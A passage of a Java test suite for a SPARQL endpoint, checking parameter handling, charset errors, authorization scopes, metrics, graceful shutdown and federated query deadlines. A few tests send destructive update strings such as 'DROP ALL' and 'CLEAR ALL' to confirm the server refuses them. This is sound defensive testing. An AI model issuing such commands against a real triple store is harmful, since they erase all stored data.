                + "&update=" + enc("DROP ALL"))).build(), HttpResponse.BodyHandlers.ofString());
        assertEquals(400, updateTwice.statusCode(), "repeated, even where a single one would be a 405: " + updateTwice.body());
        var split = post(shared.url() + "?query=" + enc("ASK {}"), "application/x-www-form-urlencoded",
                "query=" + enc("ASK { ?s ?p ?o }"), null);
        assertEquals(400, split.statusCode(), split.body());
        var direct = post(shared.url() + "?query=" + enc("ASK { ?s ?p ?o }"), "application/sparql-query", "ASK {}", null);
        assertEquals(400, direct.statusCode(), direct.body());
        var directUpdate = post(shared.url() + "?update=" + enc("CLEAR ALL"), "application/sparql-update",
                "INSERT DATA { <urn:ex:a> <urn:ex:b> <urn:ex:c> }", null);
        assertEquals(400, directUpdate.statusCode(), directUpdate.body());
        // the dataset parameters are lists by design, and stay so
        var graphs = HTTP.send(HttpRequest.newBuilder(URI.create(shared.url() + "?query=" + enc("SELECT ?s WHERE { ?s <urn:ex:p> ?o }")
                + "&default-graph-uri=" + enc("urn:ex:g1") + "&default-graph-uri=" + enc("urn:ex:g2")))
                .header("Accept", "text/csv").build(), HttpResponse.BodyHandlers.ofString());
        assertEquals(200, graphs.statusCode(), graphs.body());
        assertTrue(graphs.body().contains("g1s") && graphs.body().contains("g2s"), graphs.body());
    }

    @Test
    void bytesThatAreNotTheDeclaredCharsetAre400NotReplaced() throws Exception {
        try (Endpoint rw = Endpoint.start(EndpointOptions.defaults().withUpdateEnabled(true), 0)) {
            // "café" with é as the Latin-1 byte E9, in a body declared (by default) UTF-8: it was
            // stored as "caf�" and answered 204
            byte[] latin1 = "INSERT DATA { <urn:ex:cafe> <urn:ex:name> \"café\" }".getBytes(StandardCharsets.ISO_8859_1);
            var r = HTTP.send(HttpRequest.newBuilder(URI.create(rw.url())).header("Content-Type", "application/sparql-update")
                    .POST(HttpRequest.BodyPublishers.ofByteArray(latin1)).build(), HttpResponse.BodyHandlers.ofString());
            assertEquals(400, r.statusCode(), r.body());
            assertTrue(r.body().contains("not valid UTF-8"), r.body());
            assertFalse(ask(rw.url(), "ASK { <urn:ex:cafe> ?p ?o }"), "the update ran");
            // declared as what it is, the same bytes are fine
            var declared = HTTP.send(HttpRequest.newBuilder(URI.create(rw.url()))
                    .header("Content-Type", "application/sparql-update; charset=ISO-8859-1")
                    .POST(HttpRequest.BodyPublishers.ofByteArray(latin1)).build(), HttpResponse.BodyHandlers.ofString());
            assertEquals(204, declared.statusCode(), declared.body());
            assertTrue(ask(rw.url(), "ASK { <urn:ex:cafe> <urn:ex:name> \"café\" }"));
            // percent-escapes in a form body and in the query string are held to the same rule
            var form = post(rw.url(), "application/x-www-form-urlencoded", "query=SELECT+%28%22caf%E9%22+AS+%3Fx%29+WHERE+%7B%7D", null);
            assertEquals(400, form.statusCode(), form.body());
            // inside a literal of a valid query, so a lenient decode (U+FFFD) would answer 200
            var url = HTTP.send(HttpRequest.newBuilder(URI.create(rw.url()
                    + "?query=SELECT+%28%22caf%FF%22+AS+%3Fx%29+WHERE+%7B%7D")).build(), HttpResponse.BodyHandlers.ofString());
            assertEquals(400, url.statusCode(), url.body());
            assertTrue(url.body().contains("not valid UTF-8"), url.body());
        }
    }

    @Test
    void answersVaryOnAccept() throws Exception {
        var ok = get(shared.url(), "ASK {}", "text/csv, application/sparql-results+xml");
        assertEquals(200, ok.statusCode());
        assertTrue(ok.headers().allValues("Vary").stream().anyMatch(v -> v.contains("Accept")), ok.headers().map().toString());
        var bad = get(shared.url(), "SELEKT", null);
        assertEquals(400, bad.statusCode());
        assertTrue(bad.headers().allValues("Vary").stream().anyMatch(v -> v.contains("Accept")), bad.headers().map().toString());
        try (Endpoint cors = Endpoint.start(EndpointOptions.defaults().withAllowedOrigins(List.of("https://yasgui.example")), 0)) {
            var r = HTTP.send(HttpRequest.newBuilder(URI.create(cors.url() + "?query=" + enc("ASK {}")))
                    .header("Origin", "https://yasgui.example").build(), HttpResponse.BodyHandlers.ofString());
            String vary = String.join(", ", r.headers().allValues("Vary"));
            assertTrue(vary.contains("Origin") && vary.contains("Accept"), vary);
            assertEquals(1, vary.split("Accept", -1).length - 1, "named once: " + vary);
        }
        // the access filters' own refusals vary too: they come before the servlet
        try (Endpoint locked = Endpoint.start(EndpointOptions.defaults().withAuthToken("t"), 0)) {
            var r = get(locked.url(), "ASK {}", null);
            assertEquals(401, r.statusCode());
            assertTrue(r.headers().allValues("Vary").stream().anyMatch(v -> v.contains("Accept")), r.headers().map().toString());
        }
    }

    @Test
    void otherMethodsAre405WithAllow() throws Exception {
        for (String method : List.of("PUT", "DELETE", "PATCH", "TRACE")) {
            var r = HTTP.send(HttpRequest.newBuilder(URI.create(shared.url()))
                    .method(method, HttpRequest.BodyPublishers.noBody()).build(), HttpResponse.BodyHandlers.ofString());
            assertEquals(405, r.statusCode(), method + ": " + r.body());
            assertEquals(SparqlProtocolServlet.ALLOW, r.headers().firstValue("Allow").orElse(""), method);
        }
        var update = HTTP.send(HttpRequest.newBuilder(URI.create(shared.url() + "?update=" + enc("CLEAR ALL"))).build(),
                HttpResponse.BodyHandlers.ofString());
        assertEquals(405, update.statusCode());
        assertEquals(SparqlProtocolServlet.ALLOW, update.headers().firstValue("Allow").orElse(""));
        var options = HTTP.send(HttpRequest.newBuilder(URI.create(shared.url()))
                .method("OPTIONS", HttpRequest.BodyPublishers.noBody()).build(), HttpResponse.BodyHandlers.ofString());
        assertEquals(SparqlProtocolServlet.ALLOW, options.headers().firstValue("Allow").orElse(""));
        var head = HTTP.send(HttpRequest.newBuilder(URI.create(shared.url() + "?query=" + enc("ASK {}")))
                .method("HEAD", HttpRequest.BodyPublishers.noBody()).build(), HttpResponse.BodyHandlers.ofString());
        assertEquals(200, head.statusCode());
    }

    @Test
    void acceptParametersMayBeQuoted() {
        var reg = org.eclipse.rdf4j.query.resultio.TupleQueryResultWriterRegistry.getInstance();
        org.eclipse.rdf4j.query.resultio.QueryResultFormat json = org.eclipse.rdf4j.query.resultio.TupleQueryResultFormat.JSON;
        var xml = org.eclipse.rdf4j.query.resultio.TupleQueryResultFormat.SPARQL;
        // split at every comma, the middle of the quoted value became a range of its own, q=1,
        // matching TSV and beating the XML the client asked for
        assertEquals(xml, SparqlProtocolServlet.negotiate(
                "application/sparql-results+xml;q=0.5, text/csv;foo=\"x, text/tab-separated-values, y\"", reg, json)
                .orElseThrow().format());
        // a quoted charset is the charset; a quoted-pair is one character
        assertEquals("text/csv", SparqlProtocolServlet.negotiate("text/csv;charset=\"UTF-8\"", reg, json)
                .orElseThrow().mediaType());
        assertEquals(List.of("a", "b=\"c,d\"", " e"), SparqlProtocolServlet.splitOutsideQuotes("a,b=\"c,d\", e", ','));
        assertEquals("a\"b", SparqlProtocolServlet.unquote("\"a\\\"b\""));
        assertEquals(List.of("x=\"\\\",\"", "y"), SparqlProtocolServlet.splitOutsideQuotes("x=\"\\\",\",y", ','));
    }

    @Test
    void aReadTokenCannotUpdate() throws Exception {
        String insert = "INSERT DATA { <urn:ex:w> <urn:ex:by> <urn:ex:writer> }";
        try (Endpoint ep = Endpoint.start(EndpointOptions.defaults().withUpdateEnabled(true)
                .withAuthToken("reader").withUpdateToken("writer"), 0)) {
            var read = post(ep.url(), "application/sparql-query", "ASK {}", null, "Authorization", "Bearer reader");
            assertEquals(200, read.statusCode());
            var refused = post(ep.url(), "application/sparql-update", insert, null, "Authorization", "Bearer reader");
            assertEquals(403, refused.statusCode(), refused.body());
            assertTrue(refused.headers().firstValue("WWW-Authenticate").orElse("").contains("insufficient_scope"));
            var written = post(ep.url(), "application/sparql-update", insert, null, "Authorization", "Bearer writer");
            assertEquals(204, written.statusCode(), written.body());
            assertEquals(200, post(ep.url(), "application/sparql-query", "ASK {}", null, "Authorization", "Bearer writer").statusCode());
            assertEquals(401, post(ep.url(), "application/sparql-query", "ASK {}", null).statusCode());
            assertEquals(401, post(ep.url(), "application/sparql-query", "ASK {}", null, "Authorization", "Bearer nope").statusCode());
        }
        // an update token alone: reads open, writes behind it
        try (Endpoint ep = Endpoint.start(EndpointOptions.defaults().withUpdateEnabled(true).withUpdateToken("writer"), 0)) {
            assertEquals(200, post(ep.url(), "application/sparql-query", "ASK {}", null).statusCode());
            assertEquals(403, post(ep.url(), "application/sparql-update", insert, null).statusCode());
            assertEquals(401, post(ep.url(), "application/sparql-update", insert, null, "Authorization", "Bearer nope").statusCode());
            assertEquals(204, post(ep.url(), "application/sparql-update", insert, null, "Authorization", "Bearer writer").statusCode());
        }
        assertThrows(IllegalArgumentException.class,
                () -> EndpointOptions.defaults().withAuthToken("same").withUpdateToken("same"));
        // the filter itself, as an embedding builds it, holds to the same rule
        assertThrows(IllegalArgumentException.class, () -> new AccessFilters.BearerToken("same", "same"));
        // the same once stripped, as a presented token is
        assertThrows(IllegalArgumentException.class, () -> new AccessFilters.BearerToken("same ", "same"));
        assertThrows(IllegalArgumentException.class,
                () -> EndpointOptions.defaults().withAuthToken(" same").withUpdateToken("same"));
    }

    @Test
    void healthAndReadySayWhatIsWrong() throws Exception {
        CQELSEngine engine = CQELSEngine.builder().id("t-" + System.nanoTime()).withMemoryStore().build();
        engine.start();
        Server server = SparqlEndpointLauncher.startServer(engine, "127.0.0.1", 0,
                EndpointOptions.defaults().withMaxConcurrentQueries(1), 64, false);
        try {
            String base = base(server);
            assertEquals("ready\n", getWithin(base + "/ready", java.time.Duration.ofSeconds(2)).body());
            assertEquals("ok\n", getWithin(base + "/health", java.time.Duration.ofSeconds(2)).body());
            SparqlProtocolServlet servlet = servletOf(server);
            try (java.net.Socket upload = startUpload(base + "/sparql", 100, "AS")) {
                awaitSlotsInUse(servlet, 1);
                var full = getWithin(base + "/ready", java.time.Duration.ofSeconds(2));
                assertEquals(503, full.statusCode());
                assertTrue(full.body().contains("query slot"), full.body());
                assertEquals(200, getWithin(base + "/health", java.time.Duration.ofSeconds(2)).statusCode(),
                        "a busy endpoint is alive: liveness must not fail on it");
            }
            awaitSlotsInUse(servlet, 0);   // the closed upload hands its slot back
            assertEquals(200, getWithin(base + "/ready", java.time.Duration.ofSeconds(2)).statusCode());
            engine.close();
            var health = getWithin(base + "/health", java.time.Duration.ofSeconds(2));
            assertEquals(503, health.statusCode());
            assertTrue(health.body().contains("not running"), health.body());
            assertEquals(503, getWithin(base + "/ready", java.time.Duration.ofSeconds(2)).statusCode());
        } finally {
            server.stop();
            engine.close();
        }
    }

    @Test
    void metricsCountAnswersByStatusIncludingRefusals() throws Exception {
        try (Endpoint ep = Endpoint.start(EndpointOptions.defaults().withAuthToken("t0ken"), 0)) {
            assertEquals(401, get(ep.url(), "ASK {}", null).statusCode());
            assertEquals(200, post(ep.url(), "application/sparql-query", "ASK {}", null, "Authorization", "Bearer t0ken").statusCode());
            assertEquals(400, post(ep.url(), "application/sparql-query", "SELEKT", null, "Authorization", "Bearer t0ken").statusCode());
            String metricsUrl = base(ep.server()) + "/metrics";
            String body = "";
            for (int i = 0; i < 20 && !body.contains("code=\"400\"} 1"); i++) {   // counted as each request completes
                var m = getWithin(metricsUrl, java.time.Duration.ofSeconds(2));
                assertEquals(200, m.statusCode(), "/metrics is beside /health, outside the token");
                body = m.body();
                Thread.sleep(20);
            }
            assertTrue(body.contains("cqels_sparql_requests_total{code=\"401\"} 1"), body);
            assertTrue(body.contains("cqels_sparql_requests_total{code=\"200\"} 1"), body);
            assertTrue(body.contains("cqels_sparql_requests_total{code=\"400\"} 1"), body);
            assertTrue(body.contains("cqels_sparql_slots_limit 16"), body);
            assertTrue(body.contains("cqels_sparql_slots_in_use 0"), body);
            assertTrue(body.contains("cqels_sparql_engine_running 1"), body);
            assertFalse(body.contains("t0ken") || body.contains("ASK"), body);
            assertTrue(body.contains("cqels_sparql_aborted_total 0"), body);
            // a client that gives up mid-upload broke nothing that had been sent: not an abort
            SparqlProtocolServlet servlet = servletOf(ep.server());
            try (java.net.Socket gone = startUpload(ep.url(), 100, "AS", "Authorization: Bearer t0ken\r\n")) {
                awaitSlotsInUse(servlet, 1);
            }
            awaitSlotsInUse(servlet, 0);
            assertTrue(getWithin(metricsUrl, java.time.Duration.ofSeconds(2)).body().contains("cqels_sparql_aborted_total 0"));
        }
    }

    /** Jetty's stop cut every request in progress off at once; it now lets them finish, refusing new ones. */
    @Test
    void stopLetsARequestInProgressFinish() throws Exception {
        CQELSEngine engine = CQELSEngine.builder().id("t-" + System.nanoTime()).withMemoryStore().build();
        engine.start();
        Server server = SparqlEndpointLauncher.startServer(engine, "127.0.0.1", 0,
                EndpointOptions.defaults().withShutdownSeconds(15), 64, false);
        String base = base(server);
        try (java.net.Socket upload = startUpload(base + "/sparql", "ASK {}".length(), "AS");
             java.net.Socket kept = new java.net.Socket("127.0.0.1", URI.create(base).getPort())) {
            kept.setSoTimeout(10_000);
            assertTrue(exchange(kept, "/health").contains(" 200 "));   // a connection a client keeps open
            awaitSlotsInUse(servletOf(server), 1);
            var stopping = java.util.concurrent.CompletableFuture.runAsync(() -> {
                try {
                    server.stop();
                } catch (Exception e) {
                    throw new IllegalStateException(e);
                }
            });
            // a new request is refused while the old one drains: 503, or no connection at all
            boolean refused = false;
            for (int i = 0; i < 50 && !refused; i++) {
                try {
                    // a client of its own: a pooled connection would not show what a new client meets
                    var r = HttpClient.newHttpClient().send(HttpRequest.newBuilder(URI.create(base + "/sparql?query=" + enc("ASK {}")))
                            .timeout(java.time.Duration.ofSeconds(2)).build(), HttpResponse.BodyHandlers.ofString());
                    refused = r.statusCode() == 503;
                } catch (IOException e) {
                    refused = true;
                }
                if (!refused) {
                    Thread.sleep(50);
                }
            }
            assertTrue(refused, "a request arriving during the drain was served");
            // a new request on a connection opened before the stop is refused too, rather than
            // served and keeping the connection (and the drain) going
            String onKept = exchange(kept, "/sparql?query=" + enc("ASK {}"));
            assertTrue(onKept.contains(" 503 "), "on a kept-alive connection during the drain: " + onKept);
            assertFalse(stopping.isDone(), "stop did not wait for the request in progress");
            var out = upload.getOutputStream();
            out.write("K {}".getBytes(StandardCharsets.US_ASCII));
            out.flush();
            upload.setSoTimeout(10_000);
            String response = new String(upload.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
            assertTrue(response.startsWith("HTTP/1.1 200 "), response);
            assertTrue(response.replace(" ", "").contains("\"boolean\":true"), response);
            stopping.get(10, java.util.concurrent.TimeUnit.SECONDS);
        } finally {
            server.stop();
            engine.close();
        }
    }

    @Test
    void stopCutsOffWhatOutlivesTheDrain() throws Exception {
        CQELSEngine engine = CQELSEngine.builder().id("t-" + System.nanoTime()).withMemoryStore().build();
        engine.start();
        Server server = SparqlEndpointLauncher.startServer(engine, "127.0.0.1", 0,
                EndpointOptions.defaults().withShutdownSeconds(1).withMaxUploadSeconds(0), 64, false);
        try (java.net.Socket upload = startUpload(base(server) + "/sparql", 100, "AS")) {
            SparqlProtocolServlet servlet = servletOf(server);
            awaitSlotsInUse(servlet, 1);
            long t0 = System.nanoTime();
            stopPastTheDrain(server);
            double took = (System.nanoTime() - t0) / 1e9;
            assertTrue(took >= 0.9 && took < 6, "stop took " + took + " s for a 1 s drain");
            upload.setSoTimeout(5_000);
            byte[] rest = upload.getInputStream().readAllBytes();   // closed, not left hanging
            assertFalse(new String(rest, StandardCharsets.UTF_8).startsWith("HTTP/1.1 200"));
            awaitSlotsInUse(servlet, 0);
        } finally {
            server.stop();
            engine.close();
        }
    }

    /**
     * An update still held up when the drain ends is cut off from its client; it used to commit
     * anyway once it got going again. It is now rolled back.
     */
    @Test
    void anUpdateCutOffByTheStopIsRolledBack() throws Exception {
        CQELSEngine engine = CQELSEngine.builder().id("t-" + System.nanoTime()).withMemoryStore().build();
        engine.start();
        SlotHolder holder = new SlotHolder(engine, 1);
        holder.deaf = true;   // otherwise Jetty's interrupt on stop fails the update before it gets to commit
        Server server = SparqlEndpointLauncher.startServer(holder, null, "127.0.0.1", 0,
                EndpointOptions.defaults().withUpdateEnabled(true).withShutdownSeconds(1), 64, false);
        try {
            SparqlProtocolServlet servlet = servletOf(server);
            var update = HTTP.sendAsync(HttpRequest.newBuilder(URI.create(base(server) + "/sparql"))
                    .header("Content-Type", "application/sparql-update")
                    .POST(HttpRequest.BodyPublishers.ofString("INSERT DATA { <urn:ex:late> <urn:ex:p> <urn:ex:o> }")).build(),
                    HttpResponse.BodyHandlers.ofString());
            assertTrue(holder.entered.await(10, java.util.concurrent.TimeUnit.SECONDS));
            stopPastTheDrain(server);
            // Jetty reuses the servlet instance on a restart; the old request must not commit in
            // the new lifetime either
            server.start();
            holder.release.countDown();
            awaitSlotsInUse(servlet, 0);
            try (RepositoryConnection c = engine.getRepository().getConnection()) {
                assertFalse(c.hasStatement(iri("late"), null, null, false), "the cut-off update committed");
            }
            assertThrows(Exception.class, () -> update.get(5, java.util.concurrent.TimeUnit.SECONDS));
        } finally {
            holder.release.countDown();
            server.stop();
            engine.close();
        }
    }

    /** /metrics once every needle is in one snapshot: the counters move as each request completes, not all at once. */
    static String metricsOf(String base, String... needles) throws Exception {
        String body = "";
        for (int i = 0; i < 100 && !java.util.Arrays.stream(needles).allMatch(body::contains); i++) {
            body = getWithin(base + "/metrics", java.time.Duration.ofSeconds(2)).body();
            Thread.sleep(50);
        }
        return body;
    }

    /**
     * A response that fails after it started counts as aborted, whichever way it fails: the
     * execution limit tripping mid-stream (the servlet aborts it), or the client going away (a
     * write fails, which can happen after any servlet filter has returned).
     */
    @Test
    void responsesThatFailAfterTheyStartedAreCountedAsAborted() throws Exception {
        String cross = "SELECT * WHERE { ?a ?b ?c . ?d ?e ?f . ?g ?h ?i . ?j ?k ?l }";
        try (Endpoint slow = Endpoint.start(EndpointOptions.defaults().withMaxExecutionSeconds(1), 300)) {
            var req = HttpRequest.newBuilder(URI.create(slow.url() + "?query=" + enc(cross))).header("Accept", "text/csv").build();
            assertThrows(IOException.class, () -> HTTP.send(req, HttpResponse.BodyHandlers.discarding()));
            String body = metricsOf(base(slow.server()), "cqels_sparql_aborted_total 1");
            assertTrue(body.contains("cqels_sparql_aborted_total 1"), body);
        }
        // The client resets the connection while the servlet is held; the servlet then answers 406
        // and returns normally. That answer is only buffered (RDF4J's result writers flush the
        // stream themselves, so a 200 would fail inside the servlet, where a filter could see it):
        // Jetty's completion, after every filter has returned, is what tries to send it, and fails.
        CQELSEngine engine = CQELSEngine.builder().id("t-" + System.nanoTime()).withMemoryStore().build();
        engine.start();
        SlotHolder holder = new SlotHolder(engine, 1);
        Server server = SparqlEndpointLauncher.startServer(holder, null, "127.0.0.1", 0, EndpointOptions.defaults(), 64, false);
        try {
            try (java.net.Socket client = new java.net.Socket("127.0.0.1", URI.create(base(server)).getPort())) {
                client.getOutputStream().write(("GET /sparql?query=" + enc("ASK {}") + " HTTP/1.1\r\nHost: 127.0.0.1\r\n"
                        + "Accept: image/png\r\n\r\n").getBytes(StandardCharsets.US_ASCII));
                assertTrue(holder.entered.await(10, java.util.concurrent.TimeUnit.SECONDS));
                client.setSoLinger(true, 0);   // closed with a reset: the server's next write fails
            }
            Thread.sleep(200);
            holder.release.countDown();
            awaitSlotsInUse(servletOf(server), 0);
            String body = metricsOf(base(server), "cqels_sparql_aborted_total 1", "cqels_sparql_requests_total{code=\"406\"} 1");
            assertTrue(body.contains("cqels_sparql_aborted_total 1"), body);
            assertTrue(body.contains("cqels_sparql_requests_total{code=\"406\"} 1"), "and under the status it started with: " + body);
        } finally {
            holder.release.countDown();
            server.stop();
            engine.close();
        }
    }

    /** The access log writes a line per request — with the path, never the query — and keeps doing so after a restart. */
    @Test
    void theAccessLogWritesAndLeavesTheQueryOut() throws Exception {
        java.io.PrintStream original = System.err;
        java.io.ByteArrayOutputStream captured = new java.io.ByteArrayOutputStream();
        System.setErr(new java.io.PrintStream(captured, true, StandardCharsets.UTF_8));
        try (Endpoint ep = Endpoint.start(EndpointOptions.defaults(), 0)) {
            String secret = "urn:ex:do-not-log-" + System.nanoTime();
            assertEquals(200, get(ep.url(), "ASK { <" + secret + "> ?p ?o }", null).statusCode());
            ep.server().stop();
            ep.server().start();   // on a new ephemeral port
            assertEquals(400, get(base(ep.server()) + "/sparql", "SELEKT", null).statusCode());
            String log = "";
            for (int i = 0; i < 50 && !log.contains("\"GET /sparql HTTP/1.1\" 400"); i++) {   // written as each request completes
                Thread.sleep(20);
                log = captured.toString(StandardCharsets.UTF_8);
            }
            assertTrue(log.contains("\"GET /sparql HTTP/1.1\" 200"), log);
            assertTrue(log.contains("\"GET /sparql HTTP/1.1\" 400"), "after a restart: " + log);
            assertFalse(log.contains("do-not-log") || log.contains("SELEKT"), log);
            assertFalse(log.contains("NullPointerException"), log);
        } finally {
            System.setErr(original);
        }
    }

    /**
     * The README's claim, end to end: an update through the endpoint changes what a registered
     * continuous query joins on its next element, under a lookup cache too. Until the audit after
     * #121 only the opposite direction (results written back, then queried) was tested.
     */
    @Test
    void anUpdateReachesTheEngineOnItsNextElement() throws Exception {
        try (Endpoint e = Endpoint.start(EndpointOptions.defaults().withUpdateEnabled(true), 0)) {
            assertEquals(204, post(e.url(), "application/sparql-update",
                    "INSERT DATA { GRAPH <urn:ex:static> { <urn:ex:EV-1> <urn:ex:depot> <urn:ex:North> } }", null).statusCode());
            CQELSEngine engine = e.engine();
            DataStream telemetry = engine.createStream("Telemetry");
            var depots = new java.util.concurrent.LinkedBlockingQueue<String>();
            engine.registerCqelsQuery("""
                    REGISTER QUERY Depot AS
                    SELECT ?v ?d FROM STREAM Telemetry [NOW] FROM <urn:ex:static> CACHE 5m
                    WHERE { STREAM Telemetry { ?v <urn:ex:speed> ?kmh } ?v <urn:ex:depot> ?d }
                    """, row -> depots.add(String.valueOf(row.get("d"))));
            telemetry.push(VF.createStatement(iri("EV-1"), iri("speed"), VF.createLiteral(50)));
            assertEquals("urn:ex:North", depots.poll(10, java.util.concurrent.TimeUnit.SECONDS));
            assertEquals(204, post(e.url(), "application/sparql-update", """
                    DELETE DATA { GRAPH <urn:ex:static> { <urn:ex:EV-1> <urn:ex:depot> <urn:ex:North> } } ;
                    INSERT DATA { GRAPH <urn:ex:static> { <urn:ex:EV-1> <urn:ex:depot> <urn:ex:South> } }
                    """, null).statusCode());
            telemetry.push(VF.createStatement(iri("EV-1"), iri("speed"), VF.createLiteral(60)));
            assertEquals("urn:ex:South", depots.poll(10, java.util.concurrent.TimeUnit.SECONDS),
                    "the engine joined the cached, stale depot");
            assertTrue(depots.isEmpty(), "extra rows: " + depots);
        }
    }

    /**
     * Every format each writer registry offers, parsed back in full and compared with the result
     * evaluated directly on the repository — rather than looked at for a substring, as the protocol
     * matrix above does.
     */
    @Test
    void everyResultFormatRoundTrips() throws Exception {
        String select = """
                SELECT ?v ?d ?lang ?typed ?plain WHERE {
                  ?v <urn:ex:depot> ?d
                  BIND("Grüße"@de AS ?lang) BIND(42 AS ?typed) BIND("a,\\"b\\"\\n\\tc" AS ?plain)
                } ORDER BY ?v""";
        String construct = """
                CONSTRUCT { ?v <urn:ex:at> [ <urn:ex:depot> ?d ; <urn:ex:label> "Grüße"@de ; <urn:ex:n> 42 ] }
                WHERE { ?v <urn:ex:depot> ?d }""";
        List<org.eclipse.rdf4j.query.BindingSet> rows;
        org.eclipse.rdf4j.model.Model graph;
        try (RepositoryConnection c = shared.engine().getRepository().getConnection()) {
            rows = org.eclipse.rdf4j.query.QueryResults.asList(c.prepareTupleQuery(select).evaluate());
            graph = org.eclipse.rdf4j.query.QueryResults.asModel(c.prepareGraphQuery(construct).evaluate());
        }
        assertEquals(2, rows.size());
        int formats = 0;
        for (var f : org.eclipse.rdf4j.query.resultio.TupleQueryResultWriterRegistry.getInstance().getKeys()) {
            var r = HTTP.send(HttpRequest.newBuilder(URI.create(shared.url() + "?query=" + enc(select)))
                    .header("Accept", f.getDefaultMIMEType()).build(), HttpResponse.BodyHandlers.ofByteArray());
            assertEquals(200, r.statusCode(), f.getName());
            assertTrue(type(r).startsWith(f.getDefaultMIMEType()), f.getName() + ": " + type(r));
            var parser = org.eclipse.rdf4j.query.resultio.QueryResultIO.createTupleParser(f);
            var got = new org.eclipse.rdf4j.query.resultio.helpers.QueryResultCollector();
            parser.setQueryResultHandler(got);
            parser.parseQueryResult(new java.io.ByteArrayInputStream(r.body()));
            assertEquals(List.of("v", "d", "lang", "typed", "plain"), got.getBindingNames(), f.getName());
            if (f.equals(org.eclipse.rdf4j.query.resultio.TupleQueryResultFormat.CSV)) {
                // CSV carries lexical forms only (SPARQL 1.1 CSV/TSV §3): compare those
                for (int i = 0; i < rows.size(); i++) {
                    for (String name : got.getBindingNames()) {
                        assertEquals(rows.get(i).getValue(name).stringValue(), got.getBindingSets().get(i).getValue(name).stringValue(),
                                f.getName() + " " + name);
                    }
                }
            } else {
                assertEquals(rows, got.getBindingSets(), f.getName());
            }
            formats++;
        }
        assertTrue(formats >= 5, "SELECT formats: " + formats);
        for (var f : org.eclipse.rdf4j.query.resultio.BooleanQueryResultWriterRegistry.getInstance().getKeys()) {
            for (boolean expected : new boolean[] {true, false}) {
                String q = expected ? "ASK { ?v <urn:ex:depot> <urn:ex:North> }" : "ASK { ?v <urn:ex:depot> <urn:ex:Nowhere> }";
                var r = HTTP.send(HttpRequest.newBuilder(URI.create(shared.url() + "?query=" + enc(q)))
                        .header("Accept", f.getDefaultMIMEType()).build(), HttpResponse.BodyHandlers.ofByteArray());
                assertEquals(200, r.statusCode(), f.getName());
                var parser = org.eclipse.rdf4j.query.resultio.QueryResultIO.createBooleanParser(f);
                var got = new org.eclipse.rdf4j.query.resultio.helpers.QueryResultCollector();
                parser.setQueryResultHandler(got);
                parser.parseQueryResult(new java.io.ByteArrayInputStream(r.body()));
                assertEquals(expected, got.getBoolean(), f.getName());
            }
        }
        formats = 0;
        for (var f : org.eclipse.rdf4j.rio.RDFWriterRegistry.getInstance().getKeys()) {
            var r = HTTP.send(HttpRequest.newBuilder(URI.create(shared.url() + "?query=" + enc(construct)))
                    .header("Accept", f.getDefaultMIMEType()).build(), HttpResponse.BodyHandlers.ofByteArray());
            assertEquals(200, r.statusCode(), f.getName());
            assertTrue(type(r).startsWith(f.getDefaultMIMEType()), f.getName() + ": " + type(r));
            var parsed = org.eclipse.rdf4j.rio.Rio.parse(new java.io.ByteArrayInputStream(r.body()), shared.url(), f);
            assertTrue(org.eclipse.rdf4j.model.util.Models.isomorphic(graph, parsed), f.getName() + ": " + parsed);
            formats++;
        }
        assertTrue(formats >= 8, "graph formats: " + formats);
    }

    // ---- the SERVICE audit after #128 -----------------------------------------------------------

    /**
     * A stand-in SPARQL endpoint for bound joins: one row per {@code ?__rowIdx} RDF4J sends in its
     * VALUES block (or one row when it sends none), after {@code delayMillis}; counts its requests.
     */
    static com.sun.net.httpserver.HttpHandler rowEcho(long delayMillis, java.util.concurrent.atomic.AtomicInteger hits) {
        return rowEcho(n -> delayMillis, hits);
    }

    /** As {@link #rowEcho(long, java.util.concurrent.atomic.AtomicInteger)}, the delay chosen by the request's number (1, 2, …). */
    static com.sun.net.httpserver.HttpHandler rowEcho(java.util.function.IntToLongFunction delayMillis,
                                                      java.util.concurrent.atomic.AtomicInteger hits) {
        return ex -> {
            long delay = delayMillis.applyAsLong(hits.incrementAndGet());
            String q = ex.getRequestURI().getRawQuery() == null ? ""
                    : java.net.URLDecoder.decode(ex.getRequestURI().getRawQuery(), StandardCharsets.UTF_8);
            if (q.isEmpty()) {
                q = java.net.URLDecoder.decode(new String(ex.getRequestBody().readAllBytes(), StandardCharsets.UTF_8), StandardCharsets.UTF_8);
            }
            try {
                Thread.sleep(delay);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
            var m = java.util.regex.Pattern.compile("\\(\"(\\d+)\"").matcher(q);
            StringBuilder rows = new StringBuilder();
            while (m.find()) {
                rows.append(rows.length() == 0 ? "" : ",").append("{\"x\":{\"type\":\"literal\",\"value\":\"r\"},"
                        + "\"__rowIdx\":{\"type\":\"literal\",\"value\":\"").append(m.group(1)).append("\"}}");
            }
            if (rows.length() == 0) {
                rows.append("{\"x\":{\"type\":\"literal\",\"value\":\"r\"}}");
            }
            byte[] body = ("{\"head\":{\"vars\":[\"x\",\"__rowIdx\"]},\"results\":{\"bindings\":[" + rows + "]}}")
                    .getBytes(StandardCharsets.UTF_8);
            ex.getResponseHeaders().add("Content-Type", "application/sparql-results+json");
            ex.sendResponseHeaders(200, body.length);
            ex.getResponseBody().write(body);
            ex.close();
        };
    }

    static String values(int n) {
        StringBuilder v = new StringBuilder("VALUES ?v {");
        for (int i = 0; i < n; i++) {
            v.append(" <urn:ex:k").append(i).append('>');
        }
        return v.append(" }").toString();
    }

    static HttpResponse<String> getCsv(String url, String query) throws Exception {
        return HTTP.send(HttpRequest.newBuilder(URI.create(url + "?query=" + enc(query))).header("Accept", "text/csv")
                .timeout(java.time.Duration.ofSeconds(60)).build(), HttpResponse.BodyHandlers.ofString());
    }

    /**
     * The execution limit bounds a query's SERVICE calls together. Each request had the whole limit
     * to itself: RDF4J joins in batches of 15, so 300 rows made 20 requests, and a remote taking
     * 1.5 s each ran the query for 30 s under a 2 s limit, answered 200.
     */
    @Test
    void aQueryHasOneDeadlineForAllItsServiceCalls() throws Exception {
        var hits = new java.util.concurrent.atomic.AtomicInteger();
        // under a 2 s limit, the first batch takes 1 s and the second stalls: it may have only the
        // 1 s left, not a fresh 2 s of its own
        var remote = serve(java.util.Map.of("/slow", rowEcho(n -> n == 1 ? 1000 : 10_000, hits)));
        try (Endpoint fed = Endpoint.start(EndpointOptions.defaults().withFederationEnabled(true).withMaxExecutionSeconds(2), 0)) {
            String service = "http://127.0.0.1:" + remote.getAddress().getPort() + "/slow";
            long t0 = System.nanoTime();
